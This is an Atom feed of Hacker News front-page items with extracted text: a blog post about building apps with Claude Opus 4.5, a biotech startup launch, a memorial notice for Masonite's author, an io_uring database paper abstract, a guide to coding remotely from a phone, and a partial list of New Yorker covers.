<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2026-01-07T00:55:10.591686+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46515696</id><title>Opus 4.5 is not the normal AI agent experience that I have had thus far</title><updated>2026-01-07T00:55:18.486554+00:00</updated><content>&lt;doc fingerprint="26499875abe73fe9"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Opus 4.5 is going to change everything&lt;/head&gt;
    &lt;p&gt;If you had asked me three months ago about these statements, I would have said only someone who‚Äôs never built anything non-trivial would believe they‚Äôre true. Great for augmenting a developer‚Äôs existing workflow, and completions are powerful, but agents replacing developers entirely? No. Absolutely not.&lt;/p&gt;
    &lt;p&gt;Today, I think that AI coding agents can absolutely replace developers. And the reason that I believe this is Claude Opus 4.5.&lt;/p&gt;
    &lt;head rend="h2"&gt;Opus 4.5 is not normal&lt;/head&gt;
    &lt;p&gt;And by ‚Äúnormal‚Äù, I mean that it is not the normal AI agent experience that I have had thus far. So far, AI Agents seem to be pretty good at writing spaghetti code and after 9 rounds of copy / paste errors into the terminal and ‚Äúfix it‚Äù have probably destroyed my codebase to the extent that I‚Äôll be throwing this whole chat session out and there goes 30 minutes I‚Äôm never getting back.&lt;/p&gt;
    &lt;p&gt;Opus 4.5 feels to me like the model that we were promised - or rather the promise of AI for coding actually delivered.&lt;/p&gt;
    &lt;p&gt;One of the toughest things about writing that last sentence is that the immediate response from you should be, ‚Äúprove it‚Äù. So let me show you what I‚Äôve been able to build.&lt;/p&gt;
    &lt;head rend="h3"&gt;Project 1 - Windows Image Conversion Utility&lt;/head&gt;
    &lt;p&gt;I first noticed that Opus 4.5 was drastically different when I used it to build a Windows utility to right-click an image and convert it to different file types. This was basically a one shot build after asking Opus the best way to add a right-click menu to the file explorer.&lt;/p&gt;
    &lt;p&gt;What amazed me through the process of building this was Opus 4.5 ability to get most things right on the first try. And if it ran into errors, it would try and build using the dotnet CLI, read the errors and iterate until fixed. The only issue I had was Opus inability to see XAML errors, which I used Visual Studio to see and copy / paste back into the agent.&lt;/p&gt;
    &lt;p&gt;Opus built a site for me to distribute it and handled the bundling of the executable so as to use a powershell script for the install, uninstall. It also built the GitHub Actions which do the release and update the landing page so that all I have to do is push source.&lt;/p&gt;
    &lt;p&gt;The only place I had to use other tools was for the logo - where I used Figma‚Äôs AI to generate a bunch of different variations - but then Opus wrote the scripts to convert that SVG to the right formats for icons, even store distribution if I chose to do so.&lt;/p&gt;
    &lt;p&gt;Now this is admittedly not a complex application. This is a small Windows utility that is doing basically one thing. It‚Äôs not like I asked Opus 4.5 to build Photoshop.&lt;/p&gt;
    &lt;p&gt;Except I kind of did.&lt;/p&gt;
    &lt;head rend="h3"&gt;Project 2 - Screen recording / editing&lt;/head&gt;
    &lt;p&gt;I was so impressed by Opus 4.5 work on this utility that I decided to make a simple GIF recording utility similar to LICEcap for Mac. Great app, questionable name.&lt;/p&gt;
    &lt;p&gt;But that proved to be so easy, that I went ahead and continued adding features, including capturing and editing video, static images, adding shapes, cropping, blurs and more. I‚Äôm still working on this application as it turns out building a full on image/video editor is kind of a big undertaking. But I got REALLY far in a matter of hours. HOURS, PEOPLE.&lt;/p&gt;
    &lt;p&gt;I don‚Äôt have a fancy landing page for this one yet, but you can view all of the source code here.&lt;/p&gt;
    &lt;p&gt;I realized that if I could build a video recording app, I could probably build anything at all - at least UI-wise. But the achilles heel of all AI agents is when they have to glue together backend systems - which any real world application is going to have - auth, database, API, storage.&lt;/p&gt;
    &lt;p&gt;Except Opus 4.5 can do that too.&lt;/p&gt;
    &lt;head rend="h3"&gt;Project 3 - AI Posting Utility&lt;/head&gt;
    &lt;p&gt;Armed with my confidence in Opus 4.5, I took on a project that I had built in React Native last year and finished for Android, but gave up in the final stretches (as one does).&lt;/p&gt;
    &lt;p&gt;The application is for my wife who owns a small yard sign franchise. The problem is that she has a Facebook page for the business, but never posts there because it‚Äôs time consuming. But any good small business has a vibrant page where people can see photos of your business doing‚Ä¶whatever the heck it does. So people know that it exsits and is alive and well.&lt;/p&gt;
    &lt;p&gt;The idea is simple - each time she sets up a yard sign, she takes a picture to send to the person who ordered it so they can see it was setup. So why not have a mobile app where she can upload 10 images at a time, and the app will use AI to generate captions and then schedule them and post them over the coming week.&lt;/p&gt;
    &lt;p&gt;It‚Äôs a simple premise, but it has a lot of moving parts - there is the Facebook authentication which is a caper in and of itself - not for the faint of heart. There is authentication with a backend, there is file storage for photos that are scheduled to go out, there is the backend process which needs to post the photo. It‚Äôs a full on backend setup.&lt;/p&gt;
    &lt;p&gt;As it turns out, I needed to install some blinds in the house so I thought - why don‚Äôt I see if Opus 4.5 can build this while I install the blinds.&lt;/p&gt;
    &lt;p&gt;So I fired up a chat session and just started by telling Opus 4.5 what I wanted to build and how it would recommend handling the backend. It recommended several options but settled on Firebase. I‚Äôm not now nor have I ever been a Firebase user, but at this point I trust Opus 4.5 a lot. Probably too much.&lt;/p&gt;
    &lt;p&gt;So I created a Firebase account, upgraded to the Blaze plan with alerts for billing and Opus 4.5 got to work.&lt;/p&gt;
    &lt;p&gt;By the time I was done installing blinds, I had a functional iOS application for using AI to caption photos and posting them on a schedule to Facebook.&lt;/p&gt;
    &lt;p&gt;When I say that Opus 4.5 built this almost entirely, I mean it. It used the &lt;code&gt;firebase&lt;/code&gt; CLI to stand up any resources it needed and would tag me in for certain things like upgrading a project to the Blaze plan for features like storage, etc. The best part was that when the Firebase cloud functions would throw errors, it would automatically grep those logs, find the error and resolve it. And all it needed was a CLI. No MCP Server. No fancy prompt file telling it how to use Firebase.&lt;/p&gt;
    &lt;p&gt;And of course, since it‚Äôs solved, I had Opus 4.5 create a backend admin dashboard so I could see what she‚Äôs got pending and make any adjustments.&lt;/p&gt;
    &lt;p&gt;And since it did in a few hours what had taken me two months of work in the evenings instead of being a decent husband, I decided to make up for my dereliction of duties by building her another app for her sign business that would make her life just a bit more delightful - and eliminate two other apps she is currently paying for.&lt;/p&gt;
    &lt;head rend="h3"&gt;Project 4 - Order tracking and routing&lt;/head&gt;
    &lt;p&gt;This app parses orders from her business Gmail account to show her what sign setups / pickups she has for the day, calculates how long its going to take to go to each stop, calculates the optimal route when there is more than one stop and tracks drive time for tax purposes. She was previously using two paid apps for the last two features there.&lt;/p&gt;
    &lt;p&gt;This app also uses Firebase. Again, Opus one-shotted the Google auth email integration. This is the kind of thing that is painstakingly miserable by hand. And again, Firebase is so well suited here because Opus knows how to use the Firebase CLI so well. It needs zero instruction.&lt;/p&gt;
    &lt;head rend="h3"&gt;BUT YOU DON‚ÄôT KNOW HOW THE CODE WORKS&lt;/head&gt;
    &lt;p&gt;No I don‚Äôt. I have a vague idea, but you are right - I do not know how the applications are actually assembled. Especially since I don‚Äôt know Swift at all.&lt;/p&gt;
    &lt;p&gt;This used to be a major hangup for me. I couldn‚Äôt diagnose problems when things went sideways. With Opus 4.5, I haven‚Äôt hit that wall yet‚ÄîOpus always figures out what the issue is and fixes its own bugs.&lt;/p&gt;
    &lt;p&gt;The real question is code quality. Without understanding how it‚Äôs built, how do I know if there‚Äôs duplication, dead code, or poor patterns? I used to obsess over this. Now I‚Äôm less worried that a human needs to read the code, because I‚Äôm genuinely not sure that they do.&lt;/p&gt;
    &lt;p&gt;Why does a human need to read this code at all? I use a custom agent in VS Code that tells Opus to write code for LLMs, not humans. Think about it‚Äîwhy optimize for human readability when the AI is doing all the work and will explain things to you when you ask?&lt;/p&gt;
    &lt;p&gt;What you don‚Äôt need: variable names, formatting, comments meant for humans, or patterns designed to spare your brain.&lt;/p&gt;
    &lt;p&gt;What you do need: simple entry points, explicit code with fewer abstractions, minimal coupling, and linear control flow.&lt;/p&gt;
    &lt;p&gt;Here‚Äôs my custom agent prompt:&lt;/p&gt;
    &lt;code&gt;You are an AI-first software engineer. Assume all code will be written and maintained by LLMs, not humans. Optimize for model reasoning, regeneration, and debugging ‚Äî not human aesthetics.

These coding principles are mandatory:

1. Structure
- Use a consistent, predictable project layout.
- Group code by feature/screen; keep shared utilities minimal.
- Create simple, obvious entry points.
- Before scaffolding multiple files, identify shared structure first. Use framework-native composition patterns (layouts, base templates, providers, shared components) for elements that appear across pages. Duplication that requires the same fix in multiple places is a code smell, not a pattern to preserve.

2. Architecture
- Prefer flat, explicit code over abstractions or deep hierarchies.
- Avoid clever patterns, metaprogramming, and unnecessary indirection.
- Minimize coupling so files can be safely regenerated.

3. Functions and Modules
- Keep control flow linear and simple.
- Use small-to-medium functions; avoid deeply nested logic.
- Pass state explicitly; avoid globals.

4. Naming and Comments
- Use descriptive-but-simple names.
- Comment only to note invariants, assumptions, or external requirements.

5. Logging and Errors
- Emit detailed, structured logs at key boundaries.
- Make errors explicit and informative.

6. Regenerability
- Write code so any file/module can be rewritten from scratch without breaking the system.
- Prefer clear, declarative configuration (JSON/YAML/etc.).

7. Platform Use
- Use platform conventions directly and simply (e.g., WinUI/WPF) without over-abstracting.

8. Modifications
- When extending/refactoring, follow existing patterns.
- Prefer full-file rewrites over micro-edits unless told otherwise.

9. Quality
- Favor deterministic, testable behavior.
- Keep tests simple and focused on verifying observable behavior.

Your goal: produce code that is predictable, debuggable, and easy for future LLMs to rewrite or extend.
&lt;/code&gt;
    &lt;p&gt;All of that said, I don‚Äôt have any proof that this prompt makes a difference. I find that Opus 4.5 writes pretty solid code no matter what you prompt it with. However, because models like to write code WAY more than they like to delete it, I will at points run a prompt that looks something like this‚Ä¶&lt;/p&gt;
    &lt;code&gt;Check your LLM, AI coding principles and then do a comprehensive search of this application and suggest what we can do to refactor this to better align to those principles. Also point out any code that can be deleted, any files that can be deleted, things that should read should be renamed, things that should be restructured. Then do a write up of what that looks like. Kind of keep it high level so that it's easy for me to read and not too complex. Add sections for high, medium and lower priority And if something doesn't need to be changed, then don't change it. You don't need to change things just for the sake of changing them. You only need to change them if it helps better align to your LLM AI coding principles. Save to a markdown file.
&lt;/code&gt;
    &lt;p&gt;And you get a document that has high, medium and low priority items. The high ones you can deal with and the AI will stop finding them. You can refactor your project a million times and it will keep finding medium/low priority refactors that you can do. An AI is never ever going to pass on the opportunity to generate some text.&lt;/p&gt;
    &lt;p&gt;I use a similar prompt to find security issues. These you have to be very careful about. Where are the API keys? Is login handled correctly? Are you storing sensitive values in the database? This is probably the most manual part of the project and frankly, something that makes me the most nervous about all of these apps at the moment. I‚Äôm not 100% confident that they are bullet proof. Maybe like 80%. And that, as they say, is too damn low.&lt;/p&gt;
    &lt;head rend="h3"&gt;Times they are A-changin&lt;/head&gt;
    &lt;p&gt;I don‚Äôt know if I feel exhilarated by what I can now build in a matter of hours, or depressed because the thing I‚Äôve spent my life learning to do is now trivial for a computer. Both are true.&lt;/p&gt;
    &lt;p&gt;I understand if this post made you angry. I get it - I didn‚Äôt like it either when people said ‚ÄúAI is going to replace developers.‚Äù But I can‚Äôt dismiss it anymore. I can wish it weren‚Äôt true, but wishing doesn‚Äôt change reality.&lt;/p&gt;
    &lt;p&gt;But for everything else? Build. Stop waiting to have all the answers. Stop trying to figure out your place in an AI-first world. The answer is the same as it always was: make things. And now you can make them faster than you ever thought possible.&lt;/p&gt;
    &lt;p&gt;Just make sure you know where your API keys are.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Disclaimer: This post was written by a human and edited for spelling, grammer by Haiku 4.5&lt;/p&gt;
    &lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://burkeholland.github.io/posts/opus-4-5-change-everything/"/><published>2026-01-06T17:45:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46515777</id><title>Launch HN: Tamarind Bio (YC W24) ‚Äì AI Inference Provider for Drug Discovery</title><updated>2026-01-07T00:55:18.193302+00:00</updated><content>&lt;doc fingerprint="6f51ad5b7d3645cb"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hi HN, we're Deniz and Sherry from Tamarind Bio (&lt;/p&gt;https://www.tamarind.bio&lt;p&gt;). Tamarind is an inference provider for AI drug discovery, serving models like AlphaFold. Biopharma companies use our library of leading open-source models to design new medicines computationally.&lt;/p&gt;&lt;p&gt;Here‚Äôs a demo: https://youtu.be/luoMApPeglo&lt;/p&gt;&lt;p&gt;Two years ago, I was hired at a Stanford lab to run models for my labmates. Some post-doc would ask me to run a set of 1-5 models in sequence with tens of thousands inputs and I would email them back the result after setting up the workflow in the university cluster.&lt;/p&gt;&lt;p&gt;At some point, it became unreasonable that all of an organization's computational biology work would go through an undergrad, so we built Tamarind as a single place for all molecular AI tools, usable at massive scale with no technical background needed. Today, we are used by much of the top 20 pharma, dozens of biotechs and tens of thousands of scientists.&lt;/p&gt;&lt;p&gt;When we started getting adoption in the big pharma companies, we found that this problem also persisted. I know directors of data science, where half their job could be described as running scripts for other people.&lt;/p&gt;&lt;p&gt;Lots of companies have also deprecated their internally built solution to switch over, dealing with GPU infra and onboarding docker containers not being a very exciting problem when the company you work for is trying to cure cancer.&lt;/p&gt;&lt;p&gt;Unlike non-specialized inference providers, we build both a programmatic interface for developers along with a scientist-friendly web app, since most of our users are non-technical. Some of them used to extract proteins from animal blood before replacing that process with using AI to generate proteins on Tamarind.&lt;/p&gt;&lt;p&gt;Besides grinding out images for each of the models we serve, we‚Äôve designed a standardized schema to be able to share each model‚Äôs data format. We‚Äôve built a custom scheduler and queue optimized for horizontal scaling (each inference call takes minutes to hours, and runs on one GPU at a time), while splitting jobs across CPUs and GPUs for optimal timing.&lt;/p&gt;&lt;p&gt;As we've grown to handle a substantial portion of the biopharma R&amp;amp;D AI demand on behalf of our customers, we've expanded beyond just offering a library of open source protocols.&lt;/p&gt;&lt;p&gt;A common use case we saw from early on was the need to connect multiple models together into pipelines, and having reproducible, consistent protocols to replace physical experiments. Once we became the place to build internal tools for computational science, our users started asking if they could onboard their own models to the platform.&lt;/p&gt;&lt;p&gt;From there, we now support fine-tuning, building UIs for arbitrary docker containers, connecting to wet lab data sources and more!&lt;/p&gt;&lt;p&gt;Reach out to me at deniz[at]tamarind.bio if you‚Äôre interested in our work, we are hiring! Check out our product at https://app.tamarind.bio and let us know if you have any feedback to support how the biotech industry uses AI today.&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46515777"/><published>2026-01-06T17:49:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46515936</id><title>Dude, where's my supersonic jet?</title><updated>2026-01-07T00:55:18.091196+00:00</updated><content/><link href="https://rationaloptimistsociety.substack.com/p/dude-wheres-my-supersonic-jet"/><published>2026-01-06T17:59:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46515948</id><title>Locating a Photo of a Vehicle in 30 Seconds with GeoSpy</title><updated>2026-01-07T00:55:17.762898+00:00</updated><link href="https://geospy.ai/blog/locating-a-photo-of-a-vehicle-in-30-seconds-with-geospy"/><published>2026-01-06T18:00:27+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46516137</id><title>Passing of Joe Mancuso author of Masonite (Python web framework)</title><updated>2026-01-07T00:55:17.347080+00:00</updated><content>&lt;doc fingerprint="2c52725b5bc5a72e"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Passing of Joe Mancuso #853&lt;/head&gt;
    &lt;p&gt;-&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;Good morning Masonite community,&lt;/p&gt;
          &lt;p&gt;I regret to inform you all that @josephmancuso has passed away due to health complications. Please keep his family in your thoughts during this time.&lt;/p&gt;
          &lt;p&gt;I had the privilege of working alongside Joe for many years, and it was clear as day how much Masonite meant to him. Even when fighting for his life, he continued doing everything he could to maintain and support this project.&lt;/p&gt;
          &lt;p&gt;One of the beautiful things about open source is that we build together. While Joe is no longer with us, Masonite can continue to grow and evolve through the contributions of this community. I hope we all continue working toward the vision he poured so much of himself into.&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Beta Was this translation helpful? Give feedback.&lt;/p&gt;
    &lt;head rend="h2"&gt;Replies: 2 comments&lt;/head&gt;
    &lt;p&gt;-&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;So sad, my condolences.üòû&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Beta Was this translation helpful? Give feedback.&lt;/p&gt;
    &lt;p&gt;-&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;p&gt;This is heartbreaking. I also had the privilege of working with Joe a couple of months ago, and he was always bringing new ideas to improve and share within the open-source community.&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Beta Was this translation helpful? Give feedback.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/MasoniteFramework/masonite/discussions/853"/><published>2026-01-06T18:11:51+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46517319</id><title>High-Performance DBMSs with io_uring: When and How to use it</title><updated>2026-01-07T00:55:17.019530+00:00</updated><content>&lt;doc fingerprint="b89f341a58d3848a"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Computer Science &amp;gt; Databases&lt;/head&gt;&lt;p&gt; [Submitted on 4 Dec 2025 (v1), last revised 12 Dec 2025 (this version, v2)]&lt;/p&gt;&lt;head rend="h1"&gt;Title:High-Performance DBMSs with io_uring: When and How to use it&lt;/head&gt;View PDF HTML (experimental)&lt;quote&gt;Abstract:We study how modern database systems can leverage the Linux io_uring interface for efficient, low-overhead I/O. io_uring is an asynchronous system call batching interface that unifies storage and network operations, addressing limitations of existing Linux I/O interfaces. However, naively replacing traditional I/O interfaces with io_uring does not necessarily yield performance benefits. To demonstrate when io_uring delivers the greatest benefits and how to use it effectively in modern database systems, we evaluate it in two use cases: Integrating io_uring into a storage-bound buffer manager and using it for high-throughput data shuffling in network-bound analytical workloads. We further analyze how advanced io_uring features, such as registered buffers and passthrough I/O, affect end-to-end performance. Our study shows when low-level optimizations translate into tangible system-wide gains and how architectural choices influence these benefits. Building on these insights, we derive practical guidelines for designing I/O-intensive systems using io_uring and validate their effectiveness in a case study of PostgreSQL's recent io_uring integration, where applying our guidelines yields a performance improvement of 14%.&lt;/quote&gt;&lt;head rend="h2"&gt;Submission history&lt;/head&gt;From: Matthias Jasny [view email]&lt;p&gt;[v1] Thu, 4 Dec 2025 14:43:03 UTC (504 KB)&lt;/p&gt;&lt;p&gt;[v2] Fri, 12 Dec 2025 09:44:22 UTC (505 KB)&lt;/p&gt;&lt;head rend="h3"&gt;References &amp;amp; Citations&lt;/head&gt;&lt;p&gt; export BibTeX citation Loading... &lt;/p&gt;&lt;head rend="h1"&gt;Bibliographic and Citation Tools&lt;/head&gt;&lt;p&gt; Bibliographic Explorer (What is the Explorer?) &lt;/p&gt;&lt;p&gt; Connected Papers (What is Connected Papers?) &lt;/p&gt;&lt;p&gt; Litmaps (What is Litmaps?) &lt;/p&gt;&lt;p&gt; scite Smart Citations (What are Smart Citations?) &lt;/p&gt;&lt;head rend="h1"&gt;Code, Data and Media Associated with this Article&lt;/head&gt;&lt;p&gt; alphaXiv (What is alphaXiv?) &lt;/p&gt;&lt;p&gt; CatalyzeX Code Finder for Papers (What is CatalyzeX?) &lt;/p&gt;&lt;p&gt; DagsHub (What is DagsHub?) &lt;/p&gt;&lt;p&gt; Gotit.pub (What is GotitPub?) &lt;/p&gt;&lt;p&gt; Hugging Face (What is Huggingface?) &lt;/p&gt;&lt;p&gt; Papers with Code (What is Papers with Code?) &lt;/p&gt;&lt;p&gt; ScienceCast (What is ScienceCast?) &lt;/p&gt;&lt;head rend="h1"&gt;Demos&lt;/head&gt;&lt;head rend="h1"&gt;Recommenders and Search Tools&lt;/head&gt;&lt;p&gt; Influence Flower (What are Influence Flowers?) &lt;/p&gt;&lt;p&gt; CORE Recommender (What is CORE?) &lt;/p&gt;&lt;head rend="h1"&gt;arXivLabs: experimental projects with community collaborators&lt;/head&gt;&lt;p&gt;arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.&lt;/p&gt;&lt;p&gt;Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.&lt;/p&gt;&lt;p&gt;Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arxiv.org/abs/2512.04859"/><published>2026-01-06T19:29:15+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46517458</id><title>Stop Doom Scrolling, Start Doom Coding: Build via the terminal from your phone</title><updated>2026-01-07T00:55:16.557763+00:00</updated><content>&lt;doc fingerprint="d11490dd3b96cae3"&gt;
  &lt;main&gt;
    &lt;p&gt;A DIY approach to coding on-the-go!&lt;/p&gt;
    &lt;p&gt;As an aspiring builder, I sought out a way to keep coding while not at home. Thanks to some Claude-assisted research and troubleshooting, I can now code via the terminal on my phone anywhere at anytime via "Doom Coding" (think Doom Scrolling but more productive).&lt;/p&gt;
    &lt;p&gt;After this 5-minute setup guide, you'll be able to "doom code" anywhere you have Internet connection.&lt;/p&gt;
    &lt;p&gt;I've been amazed by how much I can get done while being so far away from home. In Taiwan, I could access my computer in Philadelphia and coded a prototype in my downtime.&lt;/p&gt;
    &lt;p&gt;Shameless plug: check out www.friendlyr.ai to help shape the future of connection!&lt;/p&gt;
    &lt;p&gt;Make sure to "Watch" this repo for future updates to this doom coding guide. As I tryout the latest mobile coding tools (e.g. Claude Code on the Web), I'll update this repository with comparisons.&lt;/p&gt;
    &lt;p&gt;Happy doom coding my friends!&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;A Computer running 24/7 with Internet Connection&lt;/item&gt;
      &lt;item&gt;A Smartphone&lt;/item&gt;
      &lt;item&gt;A Claude Pro subscription&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Use Tailscale, Termius, Claude Code, and a computer running 24/7 to continue building anywhere you have Internet connection.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Disable sleep in power settings&lt;/item&gt;
      &lt;item&gt;Enable SSH/Remote Login&lt;/item&gt;
      &lt;item&gt;Install Tailscale and sign in&lt;lb/&gt;https://tailscale.com/download&lt;/item&gt;
      &lt;item&gt;Install Claude Code on your computer&lt;lb/&gt;https://docs.anthropic.com/en/docs/claude-code/overview&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Install Tailscale ‚Üí Sign in with the same account&lt;/p&gt;&lt;lb/&gt;https://apps.apple.com/us/app/tailscale/id1470499037&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Install Termius (A Mobile Terminal Tool)&lt;/p&gt;&lt;lb/&gt;https://apps.apple.com/us/app/termius-modern-ssh-client/id549039908&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Note the MagicDNS address of your computer (e.g. my-computer.tailnet-name.ts.net)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Create a new host in Termius:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Label: What you want your connection to be called&lt;/item&gt;
          &lt;item&gt;Hostname: The MagicDNS address (my-computer.tailnet-name.ts.net)&lt;/item&gt;
          &lt;item&gt;Port: 22&lt;/item&gt;
          &lt;item&gt;Username/Password: Your login for your computer &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;If you're not able to establish a connection from your phone via Termius to your computer:&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check your phone settings to make sure you are connected to the Tailscale VPN. &lt;/item&gt;
      &lt;item&gt;Check the Tailscale app to make sure the Tailscale VPN is on. If your phone and doom coding computer do not have a green circle next to their labels, there is an issue with your Tailscale/Internet connection.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When disconnecting/reconnecting power, make sure you unlock the computer. I've ran into this issue one too many times.&lt;/p&gt;
    &lt;p&gt;End sessions by asking Claude to update CLAUDE.md with where you left off.&lt;/p&gt;
    &lt;p&gt;Go to your desired directory and start an HTTP server&lt;code&gt;python -m http.server 3005&lt;/code&gt;
then visit http://your-machine.tailnet-name.ts.net:3005/your-html-file.html in a browser on your phone.&lt;/p&gt;
    &lt;p&gt;Wherever you would use localhost:PORT to view an app on your computer, replace localhost with the computer's MagicDNS from the Tailscale app (e.g. your-computer.tailnet-name.ts.net)&lt;/p&gt;
    &lt;p&gt;Use the PostgreSQL app to view databases for your projects https://apps.apple.com/us/app/postgresql-client/id1233662353&lt;/p&gt;
    &lt;p&gt;On your computer, bookmark the sites you refer to during development (e.g. Google OAuth, GitHub) to make it easier to reference from your phone. I use the Chrome app to seamlessly access the sites I need.&lt;/p&gt;
    &lt;p&gt;Please contibute your best practices! I am looking forward to seeing all the places you will code!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/rberg27/doom-coding"/><published>2026-01-06T19:38:32+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46518106</id><title>Show HN: Finding similarities in New Yorker covers</title><updated>2026-01-07T00:55:16.100558+00:00</updated><content>&lt;doc fingerprint="ab25d1531171e208"&gt;
  &lt;main&gt;
    &lt;p&gt;2025-12-29 Lorenzo Mattotti&lt;/p&gt;
    &lt;p&gt;2025-12-22 Luci Guti√©rrez&lt;/p&gt;
    &lt;p&gt;2025-12-15 Pierre-Emmanuel Lyet&lt;/p&gt;
    &lt;p&gt;2025-12-08 Klaas Verplancke&lt;/p&gt;
    &lt;p&gt;2025-12-01 Malika Favre, and ‚ÄúEustace Tilley,‚Äù by Rea Irvin&lt;/p&gt;
    &lt;p&gt;2025-11-24 Kenton Nelson&lt;/p&gt;
    &lt;p&gt;2025-11-17 Edel Rodriguez&lt;/p&gt;
    &lt;p&gt;2025-11-10 Sergio Garc√≠a S√°nchez&lt;/p&gt;
    &lt;p&gt;2025-11-03 Victoria Tentler-Krylov&lt;/p&gt;
    &lt;p&gt;2025-10-27 Christoph Niemann&lt;/p&gt;
    &lt;p&gt;2025-10-20 Harry Bliss&lt;/p&gt;
    &lt;p&gt;2025-10-13 Brian Stauffer&lt;/p&gt;
    &lt;p&gt;2025-10-06 R. Kikuo Johnson&lt;/p&gt;
    &lt;p&gt;2025-09-29 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2025-09-22 Maira Kalman&lt;/p&gt;
    &lt;p&gt;2025-09-15 Kadir Nelson&lt;/p&gt;
    &lt;p&gt;2025-09-01 Cindy Sherman (Cover 1); ‚ÄúEustace Tilley,‚Äù by Rea Irvin (Cover 2)&lt;/p&gt;
    &lt;p&gt;2025-08-25 Sergio Garc√≠a S√°nchez and Lola Moral&lt;/p&gt;
    &lt;p&gt;2025-08-18 Lorenzo Mattotti&lt;/p&gt;
    &lt;p&gt;2025-08-11 Amy Sherald&lt;/p&gt;
    &lt;p&gt;2025-08-04 Victoria Tentler-Krylov&lt;/p&gt;
    &lt;p&gt;2025-07-28 Sergio Garc√≠a S√°nchez and Lola Moral&lt;/p&gt;
    &lt;p&gt;2025-07-21 Joost Swarte&lt;/p&gt;
    &lt;p&gt;2025-07-07 Malika Favre&lt;/p&gt;
    &lt;p&gt;2025-06-30 Christoph Niemann&lt;/p&gt;
    &lt;p&gt;2025-06-23 David Plunkert&lt;/p&gt;
    &lt;p&gt;2025-06-16 Haruka Aoki&lt;/p&gt;
    &lt;p&gt;2025-06-09 David Hockney&lt;/p&gt;
    &lt;p&gt;2025-06-02 Kadir Nelson&lt;/p&gt;
    &lt;p&gt;2025-05-26 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2025-05-12 Christoph Niemann&lt;/p&gt;
    &lt;p&gt;2025-05-05 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2025-04-28 Adrian Tomine&lt;/p&gt;
    &lt;p&gt;2025-04-21 Frank Viva&lt;/p&gt;
    &lt;p&gt;2025-04-14 Richard McGuire&lt;/p&gt;
    &lt;p&gt;2025-04-07&lt;/p&gt;
    &lt;p&gt;2025-03-31&lt;/p&gt;
    &lt;p&gt;2025-03-24 Amy Sherald&lt;/p&gt;
    &lt;p&gt;2025-03-17 Victoria Tentler-Krylov&lt;/p&gt;
    &lt;p&gt;2025-03-10 Christoph Niemann&lt;/p&gt;
    &lt;p&gt;2025-03-03 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2025-02-17&lt;/p&gt;
    &lt;p&gt;2025-02-10 Tom Gauld&lt;/p&gt;
    &lt;p&gt;2025-02-03 Kadir Nelson&lt;/p&gt;
    &lt;p&gt;2025-01-27 Till Lauer&lt;/p&gt;
    &lt;p&gt;2025-01-20 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2025-01-13 Roz Chast&lt;/p&gt;
    &lt;p&gt;2024-12-30 Diana Ejaita&lt;/p&gt;
    &lt;p&gt;2024-12-23 Kate Beaton&lt;/p&gt;
